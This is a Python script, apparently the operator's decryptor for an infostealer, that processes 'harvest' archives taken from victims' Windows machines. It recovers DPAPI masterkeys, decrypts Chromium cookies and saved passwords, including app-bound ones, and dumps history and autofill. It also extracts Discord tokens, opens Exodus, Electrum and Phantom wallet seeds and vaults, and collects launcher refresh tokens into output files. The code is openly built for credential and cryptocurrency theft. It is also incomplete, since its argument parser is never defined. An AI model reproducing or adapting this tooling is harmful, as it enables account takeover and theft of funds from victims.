#!/usr/bin/env python3
"""Server Pack Core harvest decryptor.

Point it at a harvest ZIP (or an extracted directory) and it walks everything
that can be recovered offline, in this order:

  dpapi     masterkeys from Protect/<SID>/ + the Windows password
  browsers  Local State os_crypt keys, cookies and Logins (v10; v20 with a
            SYSTEM masterkey), History and Web Data
  discord   tokens from the raw LevelDB dump
  wallets   Exodus seed, Electrum, Phantom vaults
  accounts  launcher accounts

Usage:
  ./decrypt.py harvest-*.zip                 # interactive, prompts for password
  ./decrypt.py harvest-*.zip -p 'Password1'  # non-interactive
  ./decrypt.py harvest-*.zip --list          # inventory only
  ./decrypt.py harvest-*.zip --machinekey <40 hex>   # unlock v20 cookies

Dependencies: cryptography. plyvel only for Phantom, zstandard only for some
Exodus payloads. Everything else is optional; the run tells you what it skipped.
"""

import base64
import getpass
import gzip
import hashlib
import hmac
import json
import os
import re
import shutil
import sqlite3
import struct
import sys
import tempfile
import zipfile
import zlib
from pathlib import Path

from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

# --- theme ------------------------------------------------------------------

PLAIN = {"bold": "", "dim": "", "red": "", "green": "", "yellow": "", "blue": "",
         "magenta": "", "cyan": "", "reset": ""}
ANSI = {"bold": "\033[1m", "dim": "\033[2m", "red": "\033[31m", "green": "\033[32m",
        "yellow": "\033[33m", "blue": "\033[34m", "magenta": "\033[35m",
        "cyan": "\033[36m", "reset": "\033[0m"}
T = ANSI
WIDTH = 74

HEADER_SIZE = 224
CHECKSUM_SIZE = 32
METADATA_SIZE = 256
SALT_SIZE, CIPHER_SIZE = 32, 32
BLOB_KEY_IV_SIZE, BLOB_KEY_TAG_SIZE, BLOB_KEY_KEY_SIZE = 12, 16, 32
BLOB_IV_SIZE, BLOB_TAG_SIZE = 12, 16
MAX_OUTPUT_BYTES = 4 * 1024 * 1024


def p(text="", *styles):
    if not styles:
        print(text)
        return
    codes = "".join(T[s] for s in styles if T.get(s))
    print(f"{codes}{text}{T['reset']}" if codes else text)


def title(text):
    p()
    p("─" * WIDTH, "dim")
    p(f"  {text.upper()}", "bold", "magenta")
    p("─" * WIDTH, "dim")


def banner(archive, outdir=None):
    p()
    p("╭" + "─" * (WIDTH - 2) + "╮", "cyan")
    p("│" + " ".ljust(WIDTH - 2) + "│", "cyan")
    line = "  SERVER PACK CORE  ·  HARVEST DECRYPTOR"
    pad = WIDTH - 2 - len(line)
    p("│" + f"{T['bold']}{T['magenta']}{line}{T['reset']}" + " " * pad + "│", "cyan")
    p("│" + " ".ljust(WIDTH - 2) + "│", "cyan")
    p("╰" + "─" * (WIDTH - 2) + "╯", "cyan")
    p(f"  archive  {archive}", "dim")
    if outdir:
        p(f"  output   {outdir}", "dim")
    p()


def ok(text, detail=""):
    p(f"  {T['green']}✓{T['reset']} {text}" + (f"  {T['dim']}{detail}{T['reset']}" if detail else ""))


def bad(text, detail=""):
    p(f"  {T['red']}✗{T['reset']} {text}" + (f"  {T['dim']}{detail}{T['reset']}" if detail else ""))


def warn(text, detail=""):
    p(f"  {T['yellow']}!{T['reset']} {text}" + (f"  {T['dim']}{detail}{T['reset']}" if detail else ""))


def skipped(text, detail=""):
    p(f"  {T['dim']}·{T['reset']} {T['dim']}{text}"
      + (f"  {detail}" if detail else "") + f"{T['reset']}")


def bullet(text, detail=""):
    p(f"  {T['blue']}›{T['reset']} {text}" + (f"  {T['dim']}{detail}{T['reset']}" if detail else ""))


def step(index, total, text):
    p()
    p(f"  [{index}/{total}] {T['bold']}{text}{T['reset']}")


def mask(value, keep=6):
    value = str(value)
    if len(value) <= keep * 2 + 3:
        return value
    return f"{value[:keep]}…{value[-keep:]}"


def secure(path):
    try:
        os.chmod(path, 0o600)
    except OSError:
        pass
    return path


def write(outdir, relative, text, mode="w"):
    path = outdir / relative
    path.parent.mkdir(parents=True, exist_ok=True)
    if isinstance(text, bytes):
        with open(path, "wb") as handle:
            handle.write(text)
    else:
        with open(path, "w", encoding="utf-8") as handle:
            handle.write(text)
    return secure(path)


def clip(text, limit=58):
    text = " ".join(str(text).split())
    return text if len(text) <= limit else text[: limit - 1] + "…"


# --- crypto primitives ------------------------------------------------------

def cbc_decrypt(key, iv, data):
    decryptor = Cipher(algorithms.AES(key), modes.CBC(iv)).decryptor()
    return decryptor.update(data) + decryptor.finalize()


def unpad(data):
    if not data:
        return data
    n = data[-1]
    return data[:-n] if 0 < n <= 16 and data[-n:] == bytes([n]) * n else data


ALG = {
    0x660E: (16, "aes", 16),
    0x6610: (32, "aes", 16),
    0x8004: (20, "sha1", 64),
    0x800E: (16, "sha512", 128),
    0x8009: (20, "sha1", 64),
}


def hash_name(alg):
    return ALG[alg][1]


def derive(secret, salt, keylen, count, digest):
    out = b""
    index = 1
    while len(out) < keylen:
        block = hmac.new(secret, salt + struct.pack("!L", index), digest).digest()
        index += 1
        for _ in range(count - 1):
            again = hmac.new(secret, block, digest).digest()
            block = bytes(x ^ y for x, y in zip(block, again))
        out += block
    return out[:keylen]


def _des_parity(key):
    out = bytearray()
    for byte in key:
        bits = f"{byte:08b}"[:7]
        out.append(int(bits + ("1" if bits.count("1") % 2 == 0 else "0"), 2))
    return bytes(out)


class Blob:
    """DPAPI_BLOB as defined by Windows.

    Two layouts exist in the wild: the classic CryptoAPI blob with ANSI
    description and algorithm-id strings, and the CNG blob that Windows 11
    24H2+ writes, where the description is UTF-16 and the alg ids are replaced
    by bit sizes. Both are detected by requiring the parse to end exactly at
    the buffer end.
    """

    def __init__(self, data):
        self.raw = data
        self.guid = data[24:40]
        self.salt = self.hmac_key = self.tag = self.data = b""
        self.crypt_alg = self.hash_alg = 0
        if not (self._classic(data) or self._cng(data)):
            raise ValueError("unparsable DPAPI blob")

    def _classic(self, data):
        try:
            cur = 44
            (desc_len,) = struct.unpack("<L", data[cur:cur + 4])
            cur += 4 + desc_len
            (self.crypt_alg,) = struct.unpack("<L", data[cur:cur + 4])
            cur += 4
            self.alg_id = self._take(data, cur)
            cur += 4 + len(self.alg_id)
            if not self._walk(data, cur, alg_strings=True):
                return False
            return True
        except (struct.error, ValueError):
            self.salt = self.hmac_key = self.tag = self.data = b""
            return False

    def _cng(self, data):
        try:
            cur = 44
            (desc_len,) = struct.unpack("<L", data[cur:cur + 4])
            cur += 4 + desc_len
            (self.crypt_alg,) = struct.unpack("<L", data[cur:cur + 4])
            cur += 4
            (bits,) = struct.unpack("<L", data[cur:cur + 4])
            if bits not in (0x80, 0x100, 0x200, 0x400):
                return False
            cur += 4

            def take():
                nonlocal cur
                value = self._take(data, cur)
                cur += 4 + len(value)
                return value

            def word():
                nonlocal cur
                (value,) = struct.unpack("<L", data[cur:cur + 4])
                cur += 4
                return value

            self.salt = take()
            self.hmac_key = take()          # empty in this layout
            self.hash_alg = word()
            if self.hash_alg not in ALG:
                return False
            word()                          # hash size in bits
            self.hmac_key = take()
            self.tag = take()
            self.data = take()
            return cur == len(data) and bool(self.salt) and bool(self.data)
        except (struct.error, ValueError):
            self.salt = self.hmac_key = self.tag = self.data = b""
            return False

    @staticmethod
    def _take(data, cur):
        (size,) = struct.unpack("<L", data[cur:cur + 4])
        value = data[cur + 4:cur + 4 + size]
        if len(value) < size:
            raise ValueError("truncated field")
        return value

    def _walk(self, data, cur, alg_strings):
        def take():
            nonlocal cur
            value = self._take(data, cur)
            cur += 4 + len(value)
            return value

        def word():
            nonlocal cur
            (value,) = struct.unpack("<L", data[cur:cur + 4])
            cur += 4
            return value

        self.salt = take()
        self.hmac_key = take()
        self.hash_alg = word()
        if self.hash_alg not in ALG:
            return False
        if alg_strings:
            self.alg_id = take()
        else:
            word()
        self.tag = take()
        self.data = take()
        return cur == len(data) and bool(self.salt) and bool(self.data)

    def guid_text(self):
        d1, d2, d3 = struct.unpack("<LHH", self.guid[:8])
        tail = self.guid[8:].hex()
        return f"{d1:08x}-{d2:04x}-{d3:04x}-{tail[:4]}-{tail[4:]}"

    def decrypt(self, masterkey):
        digest = hash_name(self.hash_alg)
        block = ALG[self.hash_alg][2]
        key_hash = masterkey if len(masterkey) == 20 else hashlib.sha1(masterkey).digest()
        session = hmac.new(key_hash, self.salt, digest).digest()
        if len(session) > block:
            session = hmac.new(session, digestmod=digest).digest()
        material = session
        if len(material) < ALG[self.crypt_alg][0]:
            material += b"\0" * block
            ipad = bytes(b ^ 0x36 for b in material[:block])
            opad = bytes(b ^ 0x5C for b in material[:block])
            material = (hashlib.new(digest, ipad).digest()
                        + hashlib.new(digest, opad).digest())
            material = _des_parity(material)
        plain = cbc_decrypt(material[: ALG[self.crypt_alg][0]], b"\0" * ALG[self.crypt_alg][2], self.data)
        return unpad(plain)


def masterkey_decrypt(path, secret):
    """secret is the UTF-16LE password hash for a user key, raw for SYSTEM."""
    data = path.read_bytes()
    (key_len,) = struct.unpack("<Q", data[96:104])
    mk = data[128:128 + key_len]
    salt = mk[4:20]
    (count,) = struct.unpack("<L", mk[20:24])
    (hash_alg,) = struct.unpack("<L", mk[24:28])
    (crypt_alg,) = struct.unpack("<L", mk[28:32])
    cipher = mk[32:]
    digest = hash_name(hash_alg)
    material = derive(secret, salt, ALG[crypt_alg][0] + ALG[crypt_alg][2], count, digest)
    clear = cbc_decrypt(material[: ALG[crypt_alg][0]], material[ALG[crypt_alg][0]:], cipher)
    key = clear[-64:]
    stored = clear[16: 16 + ALG[hash_alg][0]]
    mac_key = hmac.new(secret, clear[:16], digest).digest()
    if hmac.new(mac_key, key, digest).digest()[: ALG[hash_alg][0]] != stored:
        raise ValueError("wrong password")
    return key


# --- inventory --------------------------------------------------------------

class Harvest:
    def __init__(self, root):
        self.root = root
        self.report = {"archive": str(root), "started": None, "sections": {}}
        self.counts = {"cookies": 0, "logins": 0, "tokens": 0, "seeds": 0, "accounts": 0}
        self.skipped = []

    def rel(self, pattern):
        return sorted(p for p in self.root.rglob(pattern) if p.is_file())

    def browser_dirs(self):
        return sorted(p for p in (self.root / "browsers").glob("*") if p.is_dir())

    def note(self, section, key, value):
        self.report["sections"].setdefault(section, {})[key] = value

    def inventory(self):
        keys = {
            "protect blobs": (sum(1 for f in (self.root / "dpapi").rglob("*") if f.is_file())
                              if (self.root / "dpapi").is_dir() else 0),
            "browser profiles": len(self.browser_dirs()),
            "cookie databases": len(self.rel("Cookies")),
            "login databases": len(self.rel("Login_Data")),
            "key files": len(self.rel("keys.txt")),
            "discord dumps": len(self.rel("*.ldb")) + len(self.rel("*.log")),
            "exodus wallet": (self.root / "wallets" / "exodus.wallet").is_dir(),
            "wallet json": len([p for p in self.rel("*.json") if p.parent.name == "wallets"
                                or "wallet" in str(p.parent).lower()]),
            "phantom stores": len(self.rel("Local Extension Settings/*")),
            "accounts": len(self.rel("accounts.json")),
        }
        return keys


def extract(archive):
    if archive.is_dir():
        return archive, None
    workdir = Path(tempfile.mkdtemp(prefix="spc-decrypt-"))
    with zipfile.ZipFile(archive) as zf:
        zf.extractall(workdir)
    return workdir, workdir


def outdir_for(archive, override):
    if override:
        path = Path(override)
    else:
        stem = archive.stem if archive.is_file() else archive.name
        path = Path.cwd() / f"decrypted-{stem}"
    path.mkdir(parents=True, exist_ok=True)
    return path


# --- dpapi section ----------------------------------------------------------

def load_masterkeys(folder, secret, is_system=False):
    """guid -> masterkey for every Protect blob the secret opens."""
    keys = {}
    if folder is None or not folder.is_dir():
        return keys
    material = secret if is_system else hashlib.sha1(secret.encode("utf-16le")).digest()
    for blob_file in sorted(folder.iterdir()):
        if not blob_file.is_file() or blob_file.name == "Preferred":
            continue
        try:
            keys[blob_file.name.lower()] = masterkey_decrypt(blob_file, material)
        except Exception:
            pass
    return keys


def unprotect(blob_bytes, keyring, fallback=True):
    blob = Blob(blob_bytes)
    key = keyring.get(blob.guid_text().lower())
    if key is not None:
        return blob.decrypt(key)
    if fallback:
        for candidate in keyring.values():
            try:
                return blob.decrypt(candidate)
            except Exception:
                continue
    raise ValueError("no masterkey for blob")


def decode_wrapped(text):
    """`DPAPI` + base64 (Local State, keys.txt) -> raw DPAPI blob."""
    text = text.strip()
    if text.startswith("DPAPI"):
        text = text[5:]
    raw = base64.b64decode(text)
    return raw[5:] if raw[:5] == b"DPAPI" else raw


def unlock_local_state(keys_file, state_file, keyring):
    """Return the Chromium AES key for a browser, or None."""
    if keys_file and keys_file.is_file():
        for line in keys_file.read_text("utf-8", "replace").splitlines():
            if line.startswith("v10="):
                return bytes.fromhex(line[4:].strip().replace(":", ""))
            if line.startswith("dpapi_key="):
                return unprotect(decode_wrapped(line[10:]), keyring)
    if state_file and state_file.is_file():
        state = json.loads(state_file.read_text("utf-8", "replace"))
        wrapped = state.get("os_crypt", {}).get("encrypted_key")
        if wrapped:
            return unprotect(decode_wrapped(wrapped), keyring)
    return None


def unwrap_app_bound(value, system_keys, user_keys):
    """APPB blob -> candidate AES keys (SYSTEM layer, optional user layer)."""
    raw = decode_wrapped(value)
    if raw[:4] != b"APPB":
        return []
    plain = unprotect(raw[4:], system_keys)
    inner = []
    start = plain.find(APP_SIG)
    while 0 <= start < 64:
        try:
            inner.append(unprotect(plain[start:], user_keys))
        except Exception:
            pass
        start = plain.find(APP_SIG, start + 1)
    if inner:
        return inner
    if len(plain) >= 32:
        return [plain[:32]]
    return []


# --- cookies / logins -------------------------------------------------------

def decrypt_chromium(value, key, app_keys=None):
    if not value:
        return ""
    candidates = []
    if value[:3] == b"v10" and key:
        candidates.append(key)
    if value[:3] == b"v20":
        candidates.extend(app_keys or [])
    body = value[3:]
    for candidate in candidates:
        try:
            return AESGCM(candidate).decrypt(body[:12], body[12:], None).decode("utf-8", "replace")
        except Exception:
            continue
    return None


def open_db(path):
    """Copy the database with its -wal so live writes are visible."""
    temp = Path(tempfile.mkdtemp(prefix="spc-db-")) / path.name
    shutil.copy2(path, temp)
    for suffix in ("-wal", "-shm"):
        side = path.with_name(path.name + suffix)
        if side.exists():
            try:
                shutil.copy2(side, temp.with_name(temp.name + suffix))
            except OSError:
                pass
    return sqlite3.connect(f"file:{temp}?mode=ro", uri=True), temp.parent


def dump_browser(harvest, out, browser, keyring, system_keys, show):
    label = browser.name
    cookies = browser / "Default" / "Network" / "Cookies"
    logins = browser / "Default" / "Login_Data"
    state = browser / "Local State"
    keys_file = browser / "keys.txt"
    browser_keys = []
    if keys_file.is_file():
        for line in keys_file.read_text("utf-8", "replace").splitlines():
            if line.startswith("app_bound="):
                try:
                    browser_keys = unwrap_app_bound(line[10:].strip(), system_keys, keyring)
                except Exception as exc:
                    skipped(f"{label}: app-bound key failed", str(exc))
    try:
        aes = unlock_local_state(keys_file, state, keyring)
    except Exception as exc:
        aes = None
        warn(f"{label}: Local State key failed ({exc})")
    if aes:
        ok(f"{label}: profile AES key recovered")
        write(out, f"secrets/{label}-key.txt", aes.hex() + "\n")
    else:
        skipped(f"{label}: no v10 key")

    if cookies.is_file():
        rows, locked = [], 0
        try:
            conn, tmp = open_db(cookies)
            for host, name, value, enc in conn.execute(
                    "SELECT host_key, name, value, encrypted_value FROM cookies"):
                if not enc:
                    rows.append((host, name, value, "plain"))
                    continue
                plain = decrypt_chromium(enc, aes, browser_keys)
                if plain is None:
                    locked += 1
                else:
                    rows.append((host, name, plain, enc[:3].decode()))
                    harvest.counts["cookies"] += 1
            conn.close()
            shutil.rmtree(tmp, ignore_errors=True)
        except Exception as exc:
            warn(f"{label}: cookies unreadable", str(exc))
        if rows:
            write(out, f"secrets/{label}-cookies.tsv",
                  "".join(f"{h}\t{n}\t{v}\t{k}\n" for h, n, v, k in rows))
            ok(f"{label}: {len(rows)} cookies", f"{locked} still locked")
            for host, name, value, _ in rows[:show]:
                bullet(f"{clip(host, 34)}  {clip(name, 20)}", clip(value, 40))
        elif locked:
            warn(f"{label}: {locked} cookies are v20 app-bound")

    if logins.is_file():
        found = []
        try:
            conn, tmp = open_db(logins)
            for origin, user, enc in conn.execute(
                    "SELECT origin_url, username_value, password_value FROM logins"):
                if not enc:
                    continue
                plain = decrypt_chromium(enc, aes, browser_keys)
                if plain is None:
                    continue
                found.append((origin, user, plain))
                harvest.counts["logins"] += 1
            conn.close()
            shutil.rmtree(tmp, ignore_errors=True)
        except Exception as exc:
            warn(f"{label}: logins unreadable", str(exc))
        if found:
            write(out, f"secrets/{label}-logins.tsv",
                  "".join(f"{o}\t{u}\t{p}\n" for o, u, p in found))
            ok(f"{label}: {len(found)} saved passwords")
            for origin, user, plain in found[:show]:
                bullet(f"{clip(origin, 40)}  {clip(user, 18)}", clip(plain, 34))

    history = browser / "Default" / "History"
    if history.is_file():
        try:
            conn, tmp = open_db(history)
            rows = conn.execute(
                "SELECT url, title, visit_count FROM urls WHERE url NOT LIKE 'chrome://%' "
                "ORDER BY visit_count DESC LIMIT 40").fetchall()
            conn.close()
            shutil.rmtree(tmp, ignore_errors=True)
            if rows:
                write(out, f"history/{label}-urls.tsv",
                      "".join(f"{c}\t{u}\t{t}\n" for u, t, c in rows))
                ok(f"{label}: {len(rows)} top URLs")
        except Exception:
            skipped(f"{label}: history unreadable")

    web = browser / "Default" / "Web_Data"
    if web.is_file():
        try:
            conn, tmp = open_db(web)
            rows = conn.execute(
                "SELECT name, value, count FROM autofill WHERE name != '' "
                "ORDER BY count DESC LIMIT 40").fetchall()
            conn.close()
            shutil.rmtree(tmp, ignore_errors=True)
            if rows:
                write(out, f"secrets/{label}-autofill.tsv",
                      "".join(f"{n}\t{v}\t{c}\n" for n, v, c in rows))
                ok(f"{label}: {len(rows)} autofill rows")
        except Exception:
            pass


# --- discord ----------------------------------------------------------------

APP_TOKEN = re.compile(rb"dQw4w9WgXcQ:([A-Za-z0-9+/=]{40,})")
APP_SIG = b"\x01\x00\x00\x00\xd0\x8c\x9d\xdf\x01\x15\xd1\x11"


def find_tokens(harvest, keyring):
    found = []
    for dump in harvest.rel("*.ldb") + harvest.rel("*.log"):
        try:
            data = dump.read_bytes()
        except OSError:
            continue
        for match in APP_TOKEN.finditer(data):
            try:
                blob = base64.b64decode(match.group(1))
            except Exception:
                continue
            index = blob.find(APP_SIG)
            if index < 0:
                continue
            try:
                plain = unprotect(blob[index:], keyring)
            except Exception:
                continue
            for token in re.findall(rb"[MN][A-Za-z\d]{23,}\.[\w-]{6,}\.[\w-]{25,}", plain):
                found.append(token.decode())
    return found


# --- wallets ----------------------------------------------------------------

def read_seco(path):
    data = path.read_bytes()
    if data[:4] != b"SECO":
        raise ValueError("not a SECO container")
    off = HEADER_SIZE + CHECKSUM_SIZE
    meta = data[off:off + METADATA_SIZE]
    off += METADATA_SIZE
    if len(meta) < METADATA_SIZE:
        raise ValueError("truncated metadata")
    if meta[SALT_SIZE + 12: SALT_SIZE + 12 + CIPHER_SIZE].rstrip(b"\0") != b"aes-256-gcm":
        raise ValueError("unsupported cipher")
    n, r, prm = struct.unpack(">LLL", meta[SALT_SIZE:SALT_SIZE + 12])
    cur = SALT_SIZE + 12 + CIPHER_SIZE
    key_iv = meta[cur:cur + BLOB_KEY_IV_SIZE]
    key_tag = meta[cur + BLOB_KEY_IV_SIZE: cur + BLOB_KEY_IV_SIZE + BLOB_KEY_TAG_SIZE]
    wrapped = meta[cur + BLOB_KEY_IV_SIZE + BLOB_KEY_TAG_SIZE:
                   cur + BLOB_KEY_IV_SIZE + BLOB_KEY_TAG_SIZE + BLOB_KEY_KEY_SIZE]
    cur += BLOB_KEY_IV_SIZE + BLOB_KEY_TAG_SIZE + BLOB_KEY_KEY_SIZE
    blob_iv = meta[cur:cur + BLOB_IV_SIZE]
    blob_tag = meta[cur + BLOB_IV_SIZE: cur + BLOB_IV_SIZE + BLOB_TAG_SIZE]
    (size,) = struct.unpack(">L", data[off:off + 4])
    blob = data[off + 4:off + 4 + size]
    return dict(salt=meta[:SALT_SIZE], n=n, r=r, p=prm, key_iv=key_iv, key_tag=key_tag,
                wrapped=wrapped, blob_iv=blob_iv, blob_tag=blob_tag, blob=blob)


def open_seco(container, passphrase):
    kek = hashlib.scrypt(passphrase, salt=container["salt"], n=container["n"],
                         r=container["r"], p=container["p"], dklen=32,
                         maxmem=256 * container["n"] * container["r"] + (1 << 22))
    data_key = AESGCM(kek).decrypt(container["key_iv"],
                                   container["wrapped"] + container["key_tag"], None)
    return AESGCM(data_key).decrypt(container["blob_iv"],
                                    container["blob"] + container["blob_tag"], None)


def decode_payload(data):
    """Best effort text recovery from a decrypted payload."""
    pos = data.find(b"\x1f\x8b")
    while 0 <= pos < 512:
        try:
            return "gzip", zlib.decompressobj(31).decompress(data[pos:])
        except zlib.error:
            pos = data.find(b"\x1f\x8b", pos + 1)
    if data[:4] == b"\x28\xb5\x2f\xfd":
        try:
            import zstandard
            return "zstd", zstandard.ZstdDecompressor().decompress(data)
        except Exception:
            pass
    for marker in (b'{"', b'{"version', b"{", b"["):
        index = data.find(marker)
        if 0 <= index < 256:
            try:
                return f"json+{index}", data[index:]
            except Exception:
                pass
    return None, data


def bip39_scan(data):
    """Longest run of consecutive BIP39 words in printable stretches."""
    try:
        vocab = set((Path(__file__).parent / "bip39.txt").read_text().split())
    except OSError:
        return None
    if not vocab:
        return None
    for run in re.finditer(rb"[a-z ]{48,}", data):
        words = run.group().decode().split()
        index = 0
        while index < len(words):
            if words[index] not in vocab:
                index += 1
                continue
            end = index
            while end < len(words) and words[end] in vocab:
                end += 1
            count = end - index
            size = 24 if count >= 24 else count - count % 3
            if size >= 12:
                return words[index:index + size]
            index = end + 1
    return None


def dump_exodus(harvest, out, keyring, system_keys, show):
    wallet = harvest.root / "wallets" / "exodus.wallet"
    passphrase_json = wallet / "passphrase.json"
    seed = wallet / "seed.seco"
    if not seed.is_file():
        skipped("exodus: no seed.seco")
        return
    secret = None
    if passphrase_json.is_file():
        meta = json.loads(passphrase_json.read_text("utf-8", "replace"))
        raw = meta.get("passphrase", "")
        if meta.get("system") and system_keys:
            try:
                secret = unprotect(base64.b64decode(raw), system_keys)
            except Exception:
                secret = None
        if secret is None:
            for candidate in (raw.encode(), base64.b64decode(raw)):
                try:
                    open_seco(read_seco(seed), candidate)
                    secret = candidate
                    break
                except Exception:
                    continue
    if secret is None:
        skipped("exodus: passphrase does not fit")
        return
    ok("exodus: container opened")
    plain = open_seco(read_seco(seed), secret)
    write(out, "wallets/exodus-seed.bin", plain)
    how, payload = decode_payload(plain)
    text = None
    if how:
        try:
            text = payload.decode("utf-8")
        except UnicodeDecodeError:
            text = None
    if text:
        try:
            document = json.loads(text[text.find("{"):])
        except Exception:
            document = None
        mnemonic = None
        if isinstance(document, dict):
            mnemonic = document.get("mnemonic") or document.get("seed") or document.get("secret")
        if mnemonic:
            write(out, "wallets/exodus-seed.txt", mnemonic + "\n")
            harvest.counts["seeds"] += 1
            ok("exodus: mnemonic", clip(mnemonic, 46) if show else mask(mnemonic, 12))
            return
        write(out, "wallets/exodus-payload.txt", text)
        ok("exodus: payload decoded", how)
        return
    words = bip39_scan(plain)
    if words:
        write(out, "wallets/exodus-seed.txt", " ".join(words) + "\n")
        harvest.counts["seeds"] += 1
        ok("exodus: words carved from binary", " ".join(words[:6]) + " …")
    else:
        warn("exodus: seed opened but payload is an opaque envelope",
             f"{len(plain)} bytes saved to wallets/exodus-seed.bin")
    storage = wallet / "storage.seco"
    if storage.is_file():
        try:
            write(out, "wallets/exodus-storage.bin", open_seco(read_seco(storage), secret))
            ok("exodus: storage.seco also opened")
        except Exception:
            skipped("exodus: storage.seco uses another password")


def dump_electrum(harvest, out, password, show):
    total = 0
    for wallet in harvest.rel("*.json"):
        name = wallet.name.lower()
        if "wallet_data" not in wallet.read_text("utf-8", "replace")[:200].lower() \
                and "electrum" not in str(wallet).lower():
            continue
        try:
            document = json.loads(wallet.read_text("utf-8", "replace"))
        except Exception:
            continue
        if "seed" not in document and "xprv" not in document:
            continue
        total += 1
        if not document.get("use_encryption"):
            fields = {k: document[k] for k in ("seed", "xprv") if k in document}
            write(out, f"wallets/electrum-{wallet.stem}.json", json.dumps(fields, indent=2) + "\n")
            harvest.counts["seeds"] += 1
            ok(f"electrum: {wallet.name} unencrypted")
            for key, value in fields.items():
                bullet(key, clip(value, 44) if show else mask(value, 12))
            continue
        if not password:
            skipped(f"electrum: {wallet.name} needs a password")
            continue
        key = hashlib.sha256(password.encode()).digest()
        fields = {}
        for field in ("seed", "xprv"):
            if field not in document:
                continue
            blob = base64.b64decode(document[field])
            plain = unpad(cbc_decrypt(key, blob[:16], blob[16:]))
            fields[field] = base64.b64decode(plain).decode()
        if fields:
            write(out, f"wallets/electrum-{wallet.stem}.json", json.dumps(fields, indent=2) + "\n")
            harvest.counts["seeds"] += 1
            ok(f"electrum: {wallet.name} opened with the password")
            for key, value in fields.items():
                bullet(key, clip(value, 44) if show else mask(value, 12))
    if not total:
        skipped("electrum: no wallet json")


def dump_phantom(harvest, out, keyring, show):
    stores = harvest.rel("Local Extension Settings/*")
    targets = [p for p in stores if p.parent.name == "bfnaelmomeimhlpmgjnjophhpkkoljpa"]
    if not targets:
        skipped("phantom: no store")
        return
    try:
        import plyvel
    except ImportError:
        skipped("phantom: pip install plyvel")
        return
    for store in targets:
        try:
            db = plyvel.DB(str(store), create_if_missing=False)
            entries = dict(db)
            db.close()
        except Exception as exc:
            warn("phantom: store unreadable", str(exc))
            continue
        key = None
        wrapped = entries.get(b"key")
        if wrapped and wrapped[:1] == b"\x01":
            try:
                key = unprotect(wrapped[1:], keyring)
            except Exception:
                pass
        ok("phantom: store opened", f"{len(entries)} keys")
        for name in (b"vault", b"vaults"):
            if name not in entries:
                continue
            value = entries[name]
            if value[:1] == b"\x01":
                key = unprotect(value[1:], keyring)
                continue
            vault = json.loads(value)
            bullet(f"{name.decode()}: kdf {vault.get('kdf')} iterations {vault.get('iterations')}")
            write(out, "wallets/phantom-vault.json", json.dumps(vault, indent=2) + "\n")
        if key:
            write(out, "wallets/phantom-key.bin", key)
            ok("phantom: vault key recovered", key.hex()[:16] + "…")


def dump_accounts(harvest, out):
    import datetime
    for source in harvest.rel("accounts.json"):
        try:
            document = json.loads(source.read_text("utf-8", "replace"))
        except Exception:
            continue
        lines = [f"# {source.relative_to(harvest.root)}"]
        for account in document.get("accounts", []):
            profile = account.get("profile", {})
            lines.append(f"name   {profile.get('name', '?')}")
            lines.append(f"uuid   {profile.get('id', '?')}")
            refresh = account.get("msa", {}).get("refresh_token")
            if refresh:
                lines.append(f"token  {refresh}")
                harvest.counts["accounts"] += 1
            expires = account.get("msa", {}).get("exp")
            if expires:
                lines.append("expiry " + datetime.datetime.fromtimestamp(expires).isoformat())
            lines.append("")
        write(out, "accounts/launcher-accounts.txt", "\n".join(lines) + "\n")
        ok(f"accounts: {len(document.get('accounts', []))} entries", str(source.relative_to(harvest.root)))


# --- main -------------------------------------------------------------------

def main():
    global T
    args = parse_args()
    if args.no_color or not sys.stdout.isatty():
        T = PLAIN
    archive = Path(args.archive).expanduser().resolve()
    if not archive.exists():
        sys.exit(f"not found: {archive}")

    root, temp = extract(archive)
    harvest = Harvest(root)
    out = outdir_for(archive, args.out)
    banner(archive, out)

    inventory = harvest.inventory()
    title("inventory")
    for name, count in inventory.items():
        if isinstance(count, bool):
            (ok if count else skipped)(name)
        elif count:
            bullet(name, str(count))
        else:
            skipped(name)
    if args.list:
        if temp:
            shutil.rmtree(temp, ignore_errors=True)
        return

    password = args.password
    user_keys, system_keys = {}, {}
    protect = root / "dpapi" / "Protect"
    sids = [p for p in protect.iterdir() if p.is_dir()] if protect.is_dir() else []

    if sids and not (args.masterkey or password):
        if sys.stdin.isatty() and not args.quiet:
            p()
            p("  The harvested DPAPI blobs need the Windows password to open.", "dim")
            try:
                password = getpass.getpass("  password (empty to skip): ")
            except EOFError:
                password = ""
    if args.masterkey:
        user_keys["*"] = bytes.fromhex(args.masterkey)
    elif password:
        for sid in sids:
            user_keys.update(load_masterkeys(root / "dpapi" / "Protect" / sid.name, password))
    if user_keys:
        ok("dpapi: masterkeys recovered", str(len(user_keys)))
    elif sids:
        skipped("dpapi: no masterkey", "pass -p or --masterkey")
    if args.system_masterkey:
        system_keys["*"] = bytes.fromhex(args.system_masterkey)
        ok("dpapi: SYSTEM masterkey supplied")
    if args.machinekey:
        folder = (Path(args.system_protect) if args.system_protect
                  else root / "dpapi" / "Protect" / "S-1-5-18")
        system_keys.update(load_masterkeys(folder, bytes.fromhex(args.machinekey), True))
        if system_keys:
            ok("dpapi: SYSTEM masterkeys recovered", str(len(system_keys)))
        else:
            warn("dpapi: machinekey did not open any S-1-5-18 masterkey", str(folder))

    total = 7
    step(1, total, "browsers")
    for browser in harvest.browser_dirs():
        dump_browser(harvest, out, browser, user_keys, system_keys, args.show)
    if not harvest.browser_dirs():
        skipped("no browser data")

    step(2, total, "discord")
    tokens = find_tokens(harvest, user_keys)
    if tokens:
        write(out, "discord/tokens.txt", "\n".join(tokens) + "\n")
        harvest.counts["tokens"] = len(tokens)
        ok(f"discord: {len(tokens)} tokens")
        for token in tokens[:args.show]:
            bullet(clip(token, 22) if args.show else mask(token, 10))
    elif harvest.rel("*.ldb"):
        skipped("discord: tokens still encrypted", "needs the masterkey")
    else:
        skipped("discord: no raw dump")

    step(3, total, "wallets")
    dump_exodus(harvest, out, user_keys, system_keys, args.show)
    dump_electrum(harvest, out, password, args.show)
    dump_phantom(harvest, out, user_keys, args.show)

    step(4, total, "accounts")
    dump_accounts(harvest, out)

    step(5, total, "notes")
    for path in harvest.rel("*.txt"):
        if path.name in ("keys.txt", "mods.txt"):
            write(out, f"notes/{path.parent.name}-{path.name}", path.read_text("utf-8", "replace"))
            ok(str(path.relative_to(root)))

    report = {
        "archive": archive.name,
        "counts": harvest.counts,
        "masterkeys": len(user_keys),
        "tokens": tokens,
    }
    write(out, "report.json", json.dumps(report, indent=2) + "\n")
